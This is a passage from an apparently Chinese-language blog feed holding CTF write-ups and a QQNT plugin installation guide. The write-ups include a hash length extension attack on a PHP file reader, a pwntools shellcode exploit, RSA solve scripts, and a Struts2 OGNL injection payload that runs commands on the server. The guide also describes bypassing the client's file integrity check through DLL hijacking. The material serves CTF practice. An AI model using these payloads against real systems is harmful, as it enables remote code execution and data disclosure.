if(isset($_GET[&quot;md5&quot;]) &amp;&amp; isset($_GET[&quot;applicant&quot;]) &amp;&amp; isset($_GET[&quot;filename&quot;]))&#123;if($_GET[&quot;md5&quot;] === md5($secret.$_GET[&quot;applicant&quot;].$_GET[&quot;filename&quot;]))&#123;$file_contents = file_get_contents($_GET[&quot;filename&quot;]);echo $file_contents;&#125;else&#123;die(&quot;My tool is safe.&quot;);&#125;&#125;else&#123;highlight_file(__FILE__);&#125;</code></pre><p>看着像哈希长度扩展攻击<br>满足： <strong>md5(“密文”+”处理过的已知字符串”)&#x3D;处理过的哈希值</strong><br>用了hint给的payload试试<br>确定了哈希长度扩展攻击<br>题目说长度大于8，咱们爆破呗，8…9..10</p><p>看着像哈希长度扩展攻击<br>满足： md5(“密文”+”处理过的已知字符串”)&#x3D;处理过的哈希值<br>用了hint给的payload试试<br>确定了哈希长度扩展攻击<br>题目说长度大于8，咱们爆破呗，8…9..10</p><p> <img src="/img/image-20240311181406858.png" alt="image-20240311181406858"></p><blockquote><p>Input Signature: 9c80d2bb0bccfefeb3750744c0760496<br>Input Data: adminweb.log<br>Input Key Length: 15<br>Input Data to Add: &#x2F;flag<br>46879013726bfb7dff6921fd2e9ab2f8<br>adminweb.log\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0<br>0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x00\x00\x00\x00\x0<br>0\x00\x00&#x2F;flag</p></blockquote><p>Input Signature#现有哈希值（题目给的MD5）<br>Input Data        #已知字符串”web”<br>Input Key Length  #为密文长度”41”<br>Input Data to Add  #为补位后自己加的字符串（自定义）</p><p>把 <code>\x</code> 换成 <code>%</code> 然后url编码一下就行</p><p><img src="/img/image-20240311181542130.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="FUNNY"><a href="#FUNNY" class="headerlink" title="FUNNY"></a>FUNNY</h2><pre><code class="python">from Crypto.Util.number import *from gmpy2 import *p =16278587217435967524978316406283573234592438908443637927364077897515774273192577085076861144566329381837512958572889284520529086475057879835485993399620852145012913117335249011808593996938591130671812978503510805690913593132275590860265656722399885845013076862558755993506475360371865798953379337312492289107784376447589198239126291127263234784363556777780461489387706699053671315621968807065360907667815336609878856798387057891974730460404647229308105442629038061284060276648993434681114539955086828451085582033288860959729755856478065093327544217813990665326820156340461326538271909605715822484950196033809892232121330623027855970475888202583512234213349462680452400729903400494519431590431864717223438807093669836615356855072370571595889807712166659061190031457954071146645411277702230847389264989391715763232453605404095019402186331633202953693057641475300619482863265936513394341066776619336452923951439714749067348507q =165059760196977338034268528857897083190717585647808271832795575354736221674892279730906525407442580833042731114617534865267230347093979480666213073939602212663043286794259410177026619955285626139270678815060566416554620185859901611571955490060241822054715533030464833509114500388615748465579240918292431860839c =209347444484196477254668267578954904181293909211985372842733666165076889646025992007884927283300662833989678431462547742385291078285045060028956748455410812196305788814280968487973559115983082461315009316488143477261307107939530267533197821947240438534411830018967506368459544025037634267899970815198992392565948727381322854560823769432552779881938316107779842525092269591932257206582810678457433166038809740255591841951300818106018061065936083887559841543250701094558114335651396741896281230175124133873529005816838785880680073159461666783649744640398010841282229366323100807220116460976549981263966530038289223576133865992894885483308732021144420507955669760623032114718333853671281281221009397028372653797668774820725717817362383394165014402977767667433542733963298092312930702496796235196487999167666133884266829605503363510544384236303968829214389757297563873395131798724306227675722494797069994655456021649231626359765579028950908065367760981736933167557841586896807116262630848742514005606289980676609588756946993271763119859088002784499062149533167332388600036550273743940503131248513795389688869470432261503038708892320267815658450917855334244502333938120781251564676408212996623419957317150267768978807968208353379334556945d = inverse(65537, q - 1)m = powmod(c, d, q)print(long_to_bytes(m))</code></pre><h2 id="REAL-SIGN-IN"><a href="#REAL-SIGN-IN" class="headerlink" title="REAL_SIGN_IN"></a>REAL_SIGN_IN</h2><pre><code class="python">from Crypto.Util.number import *from gmpy2 import *e = 65537c1 =10454892625278317641789872724686322205927252335791803070937784201169059579634108503308033729970364983743915474860354063759051514315619953792921367621385574749886778911471839079815820922430263016140141364094131496885155882486798302404238523986615316359385759537428069831379320707742928167131988641527992674882901567191207763547432299532710945549959580670112346830919500694014972444803904248586178887470465867991650480024904327432717911313867713120525202669101524778826445503383549733326775312427637839488477432162027468606568090607495541492335140760946449358303999218277269859230888292780234275495274787996001069959971c2 =3809937396638973793281111150837774607768836561256425490071061814543315217182689579329457784159377040740840790603579270672790822179042079055887400637582022659400594844425891666493759469522229692267103516295923589666151948947533002975509430505778081264268698292606209538047240829756919764958544518311993684790118122163859571923899116815269989298822142104789156965964388346807167061332155392766290531602747731916010774318400533536413925876554324550780136191458776623029231802991319498346243427246484439391940676640693616519788950250194620455331557435567742874072637005171754550020619361150150760807391307377493836703076c3 =11563829913521314742585136805475993461403465700108053759771484386843765447294825812595747844564874801821547385942939017711043792590427266240133027831461974927558652665067213878683577605892319949704019193752250409813868906421753286690558646631157080887991363101311595921894128110588310204725909211948500421818595333014728114922612870236792445180757918034580210383348205174677492784034863701447097219480133095005954043490631339361280493810083309703940614371501369647446672052159714963350601039281652141446041256158792981347520865671115091097366786582678000769990989485879756562971825181583852052194492966890258786944315c4 =12720867554077215609167247949706745145667570273372296302246080668969511222297653722462456233088262153562301044885409538816931281414687572296907970004441185871229786306419586839050961363065587925188623309437687878362349712010861419409491068481019724226070296781806932012179356550421791040143093709543578156689726256993615533679238619784087615967419616376736870824897695863732260595608905898821074250285903989668303290834003098691902990265526695777899489911426855957844561961729063644070823142386451495647995297413399808476505524581260464059786283824394788336780567702950051743361294131648282343329587709077103035316720c5 =1996576325989768324317887012680560370528949194626393664650182754791578697786369958145137743555674312911707989139883926276952465377328602829900403114611234863417183707678398047030046855450074260654432278156903388641948696716193734714839957624359533486844023111115297718398319120718217043728064595217651738180806194912581964346594873253580010279706758241793778842399330631789750327865945625117967957133863637176404309782516880511747771793712203903185512285327103080133567660391921038681393551945607152726063692641742286406772926103324078574181176632321287759066802783643421564667257668981655199672490410258387124896839c6 =16972901653690784382193404778525843883847230468707217844241233207197480301434902629018088740822889948972102445668033489181324675531537650785766582307112083721410506834279363487814759021815005839906656731069521758605293428928322712895510490968448490116732590950772037788323801838566829526879837783860631971103738986788475652187080935944428662363573097225322630574705977616143315497272754050608117449938161772409924992453640310621899223691851303921323537779068346575997621024660907750345496836548887894110692437965970524341315015139872598871247336564148953981001708145253728789799483753931039894943324458172207408514055c7 =19248329020030453774384696880312801243022181399316695013193573740699955812434234453445733160128408889312090775734047782876100145988183327884917215679382382881065419870764186721970622248713761494850863082727373673264251951250813933154161422645331713437130381414540777017708015790836797014483890216068812718266206449620134392843370036352310247384624064366465809379383305877737001168693796305842850301708205795174536047495356081533121119809621200677554802850741327026857766466801847093397207492834507197621929666294565502206253758771807936447505283097006026148803103761799795917848061959407655084012166916418019312249784c8 =1557912453709476966737076991561069916132026563623952214325899450684779611396005511525194425002377424080593548871717093344298154722414402662579348749814362372502553596876087924405512346139642130044966150910684629355033505918013408065432489689359533653824531829749196503353303426506457519870729578421517704788083837871239684468506646791031429111449024396111145925900274462731352865657439734650971847748974665555525054155117163435567228916046859498167502129739768590572170326191362542459346405142436764480239930123323175219488501180973820200030365386979265642090761227134669853119027964377516064450203673169996741108201c9 =7054636121132343583858699301095750714111235817920115459468707884725018199621185268565462099537583727231123935665880304441155106987655834264363622503952228720525242179508079016631089564472694196928292967592007090527901832440980478605545275893294775905732209796463597105116676363505607644384293210905609044898854823349412282236466031666385339991490559120640881321780940909164095426401350314009757434019464208207922992311335823038396957805698822367795673327054284423260967631762122524511318733561339982590040303505605155884427567432712042870632816967182611225212150848091424300840160529323960243459920269872536666352976c10 =6039122660803656157700054739064564338439549484695206214016006129508782362229842967602464077735874540107161459041835340990108817139672137870642935613531313583963930144871458733026396223674801557621036949312116639217447114899726858984281194116508244403985568785765273838572470898925521147022021516862658967584135454474355381073026066426450614788381002057980590442338766869104957577338546687759141228942149374485785893539335288536729328218172278370763183603422629799846611737710865681572257803448960656692506773086527389616178693152885260795303008111935277529561576915114165678564997923634906377059491989399467738069641c11 =20247005397625616228661928392695469647749434533141783786437968083066137357689767280753532605896419173332597529708801946906363780592876111104850302784033136335456683361128603662454728234349563238948801712907903185993561076754164552845510795293521029798357876214260903355702688269527465118808832941386890598851762900876512383557653940846232884627557957652638581022140825373023173482471791720148792301241581919765510220083079365311297081633979398855966991069020584462613981094888736916444009463104235004451765533162593406749138640537670707679905027165914805299755934758172748227146495107002603546338597452964759860431081n1 =13266094979118433615107077438835111371457503704538616496563510289250600197984029767950953071723442381279904747724269706555801425883117040972832035397268347603612025741219452353130266755150965019441092380030226256032720651858600172996344598355816134478110939124633509594465443169697188695226358357129879780253706604232278678465680358018262084198108533077519049507811758423498512565521615931699494491595078723098101084217611204442585182103261006086144344612398896576066999950905966920722348056083426326740287336766359383868804991393096926457607860171709146742941740864780610226463852018204647096292737915760430291250813n2 =13561524319281645924409429988746244285924512610515302181526524036825687984904507677894611353344735741110533280540372734178963216876945066232927791369207852762146826883906093804958723203309030840804897999205074456325062789110452940484077408580876939074453733126571662068654441714639301799127584606087971553812926212292460761915985786461807649546286330834719746624387850833859250717790492671884734393055454074719585937904232516659582736211933280011591605069686791049628396762690038333975652490908544846890333889140489210242676577675968427325105786641017561929481335597681693818435892140856959673754213600282444761045909n3 =20819967432768567938753694422911303382713641435728476601586838051751312782014589687874100683447016549893853820399247909653519950995166805072380656652093579604808569443345700131756901813968185726839863492859231569896747987531341038527577030274701158504736611486411122416871876820360598851918276248520018793494992493852386399935919098185299268920688465446256283333918993392163947559470887074488117510961172278330026050882249897526926951246915378841961743261451053094912730850754242934166148766977209435597121171360066632973035097557482087715745940551760350028517912402795353929678770383484462337839762404384487582066453n4 =19517605474769458566764053169103203900538883167125789442948194023333599294853531273087386563161613748743818343948170765525802041313369094525708034240492038517491037697421019698672940028061489377078569027204940525741751607758706837789276571889269840463242449627036923444536643477208091664006240106337894541529098279162689793633659155131183323675883233214674098857553487390844015483326711766090826364639791072315148015450491509411705543419711632894282105698410629463141048089867016193055384530738113369352506445669521342292860468297676826301170714618519525841753642713267083007541894156522819536935129135488289198694889n5 =15315765971812428868126611109300419975777573811870059860288938012581131143314666287089472408729190306740351316922426244732585067377217502116440145450875665683575473308102742095244349804293311006664351646952181210686812748912418175736013835669191549110546127830831456068811493086787520032272004231879188572130659936937680177977058975692716116961651093033986073297040678707534300965722868263825444198679243070507413216087205293997006805636338567585815764233374917745809135568855524993022583535608349280044851332779641619210310837108819273508771161881712796235518243572549756276118053736270122787899173695729089911000177n6 =22501623321194869030526666823514739767749207843970334295553523279818676682652976959807729381646792676134988101065783136759904452189288813040860021497429422935571083993146794186207853146483681094375360774768406629588311381375206331368965836725531623084019451921330442379292718421616088275750226791314378297932358311378533569620671423740598033204639634035814689781736104197321348154999759210532651451336192376531975837284751978609197068573278551236896713762616106051882505752287773203197087939983952212761603430314087275042009367400077728025285967811883773835952547025411853395307325959904214255100115763377527761863243n7 =20222972180177072345801227937253710431874005900913732040381986459681923475683145372990375296354647420667483866455563976492495863306613645199351725323069254033914660444884681801701527128578914815647228265457580192591405358646605069362025887082090772778349481109768859094222573588734354390770166651349176555216207359309348018342505464249804607873118984688190648392606550835717828160317062604597079101529586592809846608153548090689114431569844519317969076852156023429809918618137153901636552629572816865533796914796916912143735510069871682428043277595493567381686086440480398579063801490541087200975224372047447666853577n8 =28799545621025859784610107508239196961299975467825740831913751504915874851330462439158635575405356818113410333683180082332165697120427112955103148744439425445183885200419323900649247390987373643732545351428341672132606990651983217136427779727640093677134233750683573339125630816150512829880758197582740742903567508671599670638441690064624970884849155079924261319378412468315205937959638074779010811695132863607314175199659821450983825173738122749043063821539706648079731459596593171608003970504410762959266052601005965264083020025264976022719772719760327913949451765549596654112776579032915566112007668167772800022899n9 =10724722645304259715795299819065674754042984013786210584506231300619560676108475536395272046569973743641251757746061197828519780315618458377103563062231183483417813026164932742828160245936263717653018746001798106670074713826425538758327538077666818411803556790303118703675214570232032363741244652199877829850941356975349610433270602500949664737614829264570720376982697613497917773407899889472415398738368753150300782201701629840263791099898799223939097237737763305744244520913831151361155926462086252389196548583215275230652627205709362921989235487237437830519479308853639024184940767904019468405024567279269194660457n10 =16304817901397483417456609341516124523232426780023397228272913044723365389571327797134591736977502692057727416394924310828824378024812777529367342707896494815960255682947685036902235997899886291633609041685897197272675911304941501067794795285949540313990226409651292120126492714998892290044111541098365692731185787360609198921681736777103794430653696698141195954719030883935151980847339939213040373252819145655067286986300641668994700390921458682571619409488233289211738521046085311253119526685912893458131534718050802684180285138809217274273877376347024021056317566312186133916744533463879779997794540361760393219489n11 =26625591570108917991847624024325819020320989255483608230644879476517915211995542896341416515605576928392317717654695767006784744751962205355107012859426134474074616134986414248054781712130892076462288761672616993287474215271046602443215449210026303978249752825306035097841429567784265656890801589418315449927543660131967365276637662563112328427813183398517944210120851841495001293543971765864382060100600179108814852829473884481867272716907064729991187798328733196676298681328399250356028155411865948758466337763025886685436650643428510593697176416735568250615673642866668416526682341721998481502482877972649018501469for i in range(1, 11):for j in range(i + 1, 11):ni = eval(&quot;n&quot; + str(i))nj = eval(&quot;n&quot; + str(j))p = gcd(ni, nj)if p &gt; 1:c = eval(&quot;c&quot; + str(i))q = ni // pd = invert(e, (p - 1) * (q - 1))flag = long_to_bytes(pow(c, d, ni))print(flag)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NT</title>
      <link href="/2024/03/05/qqnt/"/>
      <url>/2024/03/05/qqnt/</url>
      
        <content type="html"><![CDATA[<h1 id="QQNT框架的插件"><a href="#QQNT框架的插件" class="headerlink" title="QQNT框架的插件"></a>QQNT框架的插件</h1><p><a href="https://liteloaderqqnt.github.io/">链接</a>很详细</p><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p>需要先下载 LiteLoaderQQNT 到任意位置，以下有两种方式</p><ul><li><p><strong>通过 Release</strong></p><p>前往 LiteLoaderQQNT 仓库，在 Release 中 Latest 内，下载 <code>LiteLoaderQQNT.zip</code> 文件，将压缩包内 LiteLoaderQQNT 目录解压到任意位置</p><p>LiteLoaderQQNT：<a href="https://github.com/LiteLoaderQQNT/LiteLoaderQQNT">https://github.com/LiteLoaderQQNT/LiteLoaderQQNT</a></p></li><li><p><strong>通过 Clone</strong></p><p>使用 Git 工具将 LiteLoaderQQNT 仓库 Clone 到本地任意位置</p></li></ul><p>shell</p><pre><code>git clone --depth 1 https://github.com/LiteLoaderQQNT/LiteLoaderQQNT.git</code></pre><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>找到 QQNT 安装目录，编辑 <code>resources\app\app_launcher\index.js</code> 文件，在最面插入一行<code>require(String.raw</code>此处为你 LiteLoaderQQNT 目录路径<code>);</code></p><p>效果如下：</p><pre><code class="javascript">require(String.raw`C:\LiteloaderQQNT`); // 此处换成你 LiteLoaderQQNT 目录位置require(&#39;./launcher.node&#39;).load(&#39;external_index&#39;, module);</code></pre><p>请确保拥有 QQNT 安装目录的读写权限！如果不想给予 QQNT 安装目录读写权限（默认都有</p><ul><li>将 <code>LiteLoaderQQNT/src/preload.js</code> 复制到 <code>QQNT/resources/app/versions/此处为版本号/application/preload.js</code></li></ul><p>LiteLoaderQQNT 会在第二步骤的文件不一致或没有文件时自动复制，也就是说在更新本体后（即LiteLoaderQQNT）需再进行一次这步骤</p><h2 id="3、完整性验证"><a href="#3、完整性验证" class="headerlink" title="3、完整性验证"></a>3、完整性验证</h2><p> Windows 系统平台 QQNT 被添加文件完整性验证</p><p>修改文件后启动QQNT会被告知错误</p><p>解决方法如下：</p><ul><li><p><strong>DLLHijackMethod</strong></p><p>在 Release 下载 dll 文件，重命名为 dbghelp.dll 放入 QQ.exe 同级目录下即可<br><a href="https://github.com/LiteLoaderQQNT/QQNTFileVerifyPatch/tree/DLLHijackMethod">https://github.com/LiteLoaderQQNT/QQNTFileVerifyPatch/tree/DLLHijackMethod</a></p></li><li><p><strong>QQNTFileVerifyPatch</strong></p><p>在 Release 下载 exe 文件，运行将弹出文件选择框，进入 QQNT 安装目录选择 QQ.exe 开始修补，每次更新都需要重新修补</p><p><a href="https://github.com/xh321/LiteLoaderQQNT-PatcherNFixer">https://github.com/xh321/LiteLoaderQQNT-PatcherNFixer</a></p></li><li><p><strong>PatcherNFixer</strong></p><p>在 Release 下载 zip 文件，解压后运行 exe 将弹出图形化界面，根据软件界面提示选择相应选项与修补方式，每次更新都需要重新修补<br><a href="https://github.com/xh321/LiteLoaderQQNT-PatcherNFixer">https://github.com/xh321/LiteLoaderQQNT-PatcherNFixer</a></p></li><li><p><strong>V8Killer</strong></p><p>此方式目前过于麻烦，且需要自行寻找对应的 RVA 偏移量，只说明此方式的可行性，需自行探索使用方式<br><a href="https://github.com/ShellWen/v8_killer">https://github.com/ShellWen/v8_killer</a></p></li></ul><h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><p>按照上述教程完成安装后，有两种方法检查 LiteLoaderQQNT 是否成功安装</p><p>建议第一个</p><ul><li>运行 QQNT 并打开设置，查看左侧列表是否出现 <code>LiteLoaderQQNT</code> 选项</li><li>使用终端运行 QQNT 查看是否有 LiteLoaderQQNT 相关内容输出显示</li></ul><h2 id="5、删除，更新"><a href="#5、删除，更新" class="headerlink" title="5、删除，更新"></a>5、删除，更新</h2><p>完成上述安装，还原 0.x 版本需修改的 <code>package.json</code> 文件 <code>main</code> 字段</p><ul><li><strong>如果你想保留插件数据，比如防撤回的数据</strong><ol><li>在存储目录中将 <code>plugins_data</code> 重命名为 <code>data</code></li><li>除 <code>data</code> 外，删除其他所有文件</li><li>根据上述 <code>存储目录</code> 一栏进行操作</li></ol></li><li><strong>如果你想完全重新开始，不会保留任何数据</strong><ol><li>删除 LiteLoaderQQNT 0.x 版本本体目录</li><li>删除 <code>LITELOADERQQNT_PROFILE</code> 环境变量</li><li>删除 <code>LITELOADERQQNT_PROFILE</code> 存储目录</li><li>删除 <code>QQNT/resources/app/versions/版本号/plugin-preloads.js</code></li></ol></li></ul><h2 id="6、插件"><a href="#6、插件" class="headerlink" title="6、插件"></a>6、插件</h2><p>安装别人写好的插件</p><ul><li>插件商店：<a href="https://github.com/Night-stars-1/LiteLoaderQQNT-Plugin-Plugin-Store">https://github.com/Night-stars-1/LiteLoaderQQNT-Plugin-Plugin-Store</a><ul><li>顾名思义，安装后支持的插件可以从里面下载</li></ul></li></ul><p>步骤如下：</p><ul><li>下载完source.zip后</li><li>将压缩包中的内容解压到LiteLoaderQQNT数据目录的 plugins 文件夹下</li><li>重启 QQNT 安装完成</li></ul><p>手动安装其他插件同样如此</p><ul><li>github搜索LiteLoaderQQNT插件</li><li>官方商店：<a href="https://liteloaderqqnt.github.io/">https://liteloaderqqnt.github.io/</a></li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><blockquote><p>原版QQ&#x2F;TIM&#x2F;轻聊版防撤回</p><p>微信多开，防撤回</p></blockquote><p>图形化，一键式，⭐25.4K</p><p><a href="https://github.com/huiyadanli/RevokeMsgPatcher">链接</a></p><h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p><strong>作为搬运工，一切旨在学习，请勿用于非法和商业用途</strong></p>]]></content>
      
      
      <categories>
          
          <category> SOME </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青少年ctf2024#Round_1</title>
      <link href="/2024/03/04/qsnctf2024-Round-1/"/>
      <url>/2024/03/04/qsnctf2024-Round-1/</url>
      
        <content type="html"><![CDATA[<p>菜的雅痞</p><p><img src="/img/image-20240304181302050.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easymd5"><a href="#easymd5" class="headerlink" title="easymd5"></a>easymd5</h2><p><strong>fastcoll md5碰撞 生成两个md5后一样的文件，改为pdf上传</strong></p><p><img src="/img/image-20240304181356526.png"></p><h2 id="PHP的后门"><a href="#PHP的后门" class="headerlink" title="PHP的后门"></a>PHP的后门</h2><p>看 and 搜 一下PHP版本，全是</p><p><img src="/img/image-20240304181436426.png"></p><h2 id="PHP的XXE"><a href="#PHP的XXE" class="headerlink" title="PHP的XXE"></a>PHP的XXE</h2><p>dom.php中利用xxe</p><p><img src="/img/image-20240304181450963.png"></p><h2 id="Easy-SQLi"><a href="#Easy-SQLi" class="headerlink" title="Easy_SQLi"></a>Easy_SQLi</h2><p>POST的sql注入</p><p>保存数据包为1.txt</p><p><img src="/img/image-20240304181508848.png"></p><p>sqlmap梭</p><p><img src="/img/image-20240304181541657.png"></p><h2 id="雏形系统"><a href="#雏形系统" class="headerlink" title="雏形系统"></a>雏形系统</h2><p>dirsearch扫一下，发现<a href="http://www.zip/">www.zip</a></p><p>解混淆，base url 编码解一下，eval改为echo输出原内容</p><p>反序列化</p><p><img src="/img/6b556b2f-460f-4aaa-b63a-3b483d1b9d15.png"></p><p>传参</p><p><img src="/img/image-20240304181806873.png" alt="image-20240304181806873"></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="来打CS咯"><a href="#来打CS咯" class="headerlink" title="来打CS咯"></a>来打CS咯</h2><p><a href="https://s.threatbook.com/report/file/1f795a15191a4e19d32f4be3011beb6e718f2e62fe01dffebdd715424abd2f13">https://s.threatbook.com/report/file/1f795a15191a4e19d32f4be3011beb6e718f2e62fe01dffebdd715424abd2f13</a></p><p>云沙箱运行一下得到IP</p><p><img src="/img/image-20240304181823770.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="简单的数学题"><a href="#简单的数学题" class="headerlink" title="简单的数学题"></a>简单的数学题</h2><p>三道计算题</p><p><a href="https://zs.symbolab.com/solver">https://zs.symbolab.com/solver</a></p><p>前两道随便找个在线网站一键计算，最后的数有点大，使用sagemath进行计算即可</p><pre><code class="Python">from sage.all import *x = SR.var(&#39;x&#39;)f = x**10 + 2**10 - 4*x - 6131066258749sol = find_root(f, 0, 100000)  print(sol)</code></pre><h2 id="Easy-Shellcode"><a href="#Easy-Shellcode" class="headerlink" title="Easy_Shellcode"></a>Easy_Shellcode</h2><pre><code class="Python">from pwn import *from LibcSearcher import *from ctypes import *context(os=&#39;Linux&#39;,arch = &#39;amd64&#39;,log_level =&#39;debug&#39;)# p = process(&#39;./pwn&#39;)# p = gdb.debug(&#39;./pwn&#39;)p = remote(&#39;challenge.qsnctf.com&#39;,31862)elf = ELF(&#39;./pwn&#39;)# libc = cdll.LoadLibrary(&#39;libc.so.6&#39;) # libc.srand(1) #设置种子sa = lambda s,n : p.sendafter(s,n)sla = lambda s,n : p.sendlineafter(s,n)sl = lambda s : p.sendline(s)sd = lambda s : p.send(s)rc = lambda n : p.recv(n)rcv = lambda : p.recv()ru = lambda s : p.recvuntil(s)it = lambda : p.interactive()d = lambda :gdb.attach(p)b = lambda :pause()buf = int(rc(16)[2:-1],16)print(buf)shellcode = asm(shellcraft.sh())payload = shellcode.ljust(0x108,b&#39;a&#39;) + p64(buf)# d()# b()sl(payload)it()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CTFer-Revenge"><a href="#CTFer-Revenge" class="headerlink" title="CTFer Revenge"></a>CTFer Revenge</h2><p>发现RAR文件的文件头，猜测是逆置的，编写代码反转回去</p><p><img src="/img/image-20240304181840401.png"></p><pre><code class="Python">import re# 读取文本文件with open(&#39;11.txt&#39;, &#39;r&#39;) as file:    lines = file.read()# 使用splitlines()方法将文本分割成行列表lines_list = lines.splitlines()def remove_between_pipes(line):    return re.sub(r&#39;(\|.+\|)&#39;, &#39;&#39;, line)new_lines_list = []for line in lines_list:    new_line = line[:-8]    new_line = remove_between_pipes(new_line)    new_lines_list.append(&#39; &#39;.join(new_line.split(&#39;\n&#39;)))# 将结果写入新的文本文件with open(&#39;114.txt&#39;, &#39;w&#39;) as new_file:    for new_line in new_lines_list:        new_file.write(new_line.replace(&quot; &quot;, &quot;&quot;))with open(&#39;114.txt&#39;, &#39;r&#39;) as file:    lines = file.read()    new_lines_list = lines[::-1]with open(&#39;114.txt&#39;, &#39;w&#39;) as new_file:    for new_line in new_lines_list:        new_file.write(new_line.replace(&quot; &quot;, &quot;&quot;))</code></pre><p>010导入16进制文件即可，保存成RAR</p><p><img src="/img/image-20240304181855632.png"></p><p>最后用ARCHPR通过提示爆破密码</p><p><img src="/img/image-20240304181905384.png"></p><p><img src="/img/image-20240304181912824.png"></p><h2 id="ez-model"><a href="#ez-model" class="headerlink" title="ez_model"></a>ez_model</h2><p>网上搜索脚本，直接查看模型数据</p><pre><code class="Python">import torchpthfile = r&#39;./easy.pth&#39;  # .pth文件的路径model = torch.load(pthfile, torch.device(&#39;cpu&#39;))  # 设置在cpu环境下查询print(&#39;type:&#39;)print(type(model))  # 查看模型字典长度print(&#39;length:&#39;)print(len(model))print(&#39;key:&#39;)for k in model.keys():  # 查看模型字典里面的key    print(k)print(&#39;value:&#39;)for k in model:  # 查看模型字典里面的value    print(k, model[k])</code></pre><p><img src="/img/image-20240304182024110.png"></p><p>通过两次解码，猜测是变表的base64</p><p><img src="/img/image-20240304182059239.png"></p><h2 id="追光者"><a href="#追光者" class="headerlink" title="追光者"></a>追光者</h2><p>bandizip修复一下压缩包</p><p>发现</p><p><img src="/img/image-20240304182114223.png"></p><p>binwalk分离追光者.jpg发现一个压缩包</p><p><img src="/img/image-20240304182138017.png"></p><p>注释算是提示吧 :(&#x3D;</p><p>从追光者.jpg中发现密码（别抽象了哥，求你了）</p><p><img src="/img/image-20240304182153591.png"></p><p>txt中部分flag</p><p>解压发现可以利用明文攻击,拿到另一部分flag文件，逆序一下</p><p><img src="/img/image-20240304182206982.png"></p><h2 id="多情"><a href="#多情" class="headerlink" title="多情"></a>多情</h2><p>分离出一张图片，看文字提示修改宽高发现996</p><p>转二进制排序文本中的内容</p><p><img src="/img/image-20240304182217742.png"></p><h2 id="小光的答案之书"><a href="#小光的答案之书" class="headerlink" title="小光的答案之书"></a>小光的答案之书</h2><p>圣堂武士密码，life</p><p>关注公众号，拿flag</p><p><img src="/img/image-20240304182251334.png"></p><h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>qsnctf{青少年CTF蒸蒸日上}</p><p>没抽到奖，难受</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="解个方程"><a href="#解个方程" class="headerlink" title="解个方程"></a>解个方程</h2><p><img src="/img/image-20240304182309783.png"></p><h2 id="ez-log"><a href="#ez-log" class="headerlink" title="ez_log"></a>ez_log</h2><p><a href="https://blog.csdn.net/Luiino/article/details/126117985">https://blog.csdn.net/Luiino/article/details/126117985</a></p><p><a href="https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/">https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/</a></p><p>离散对数</p><p> 利用sympy库中的discrete_log(x,y,z)函数可求解，x:模数，y:余数，z:底数</p><pre><code class="Python">from Crypto.Util.number import *import sympyimport binasciim = 3c = 2755382540415579102071064701464875587397358450731640269892589311709262533380944401636001606033435395119029405853044523473152024882723244640973125106544997919867124733729051371170794687714291n = 3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037flag = sympy.discrete_log(n, c, m)print(long_to_bytes(flag))</code></pre><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p><img src="/img/image-20240304182324536.png"></p><p>拿到d和r</p><p>用r做n，直接解rsa</p><p><img src="/img/image-20240304182338103.png"></p><h2 id="四重加密"><a href="#四重加密" class="headerlink" title="四重加密"></a>四重加密</h2><p>压缩包注释 base64 拿到密码 qsnctf</p><p>html转换</p><p><img src="/img/image-20240304182350510.png"></p><p>维吉尼亚然后rot13</p><p>flag{ldvgosdabv_kfkjc_jcvsbdi}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>struts2</title>
      <link href="/2023/11/03/java/"/>
      <url>/2023/11/03/java/</url>
      
        <content type="html"><![CDATA[<h1 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h1><p>给了个登录框，提示<code>echo FLAG</code>,这是个struts2漏洞</p><p>payload（解析问题，请忽略反引号</p><pre><code class="java">`%&#123;`#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</code></pre><p><img src="/img/image-20231103185122369.png"></p><h2 id="struts2漏洞-S2-001"><a href="#struts2漏洞-S2-001" class="headerlink" title="struts2漏洞 S2-001"></a>struts2漏洞 S2-001</h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>struts2漏洞 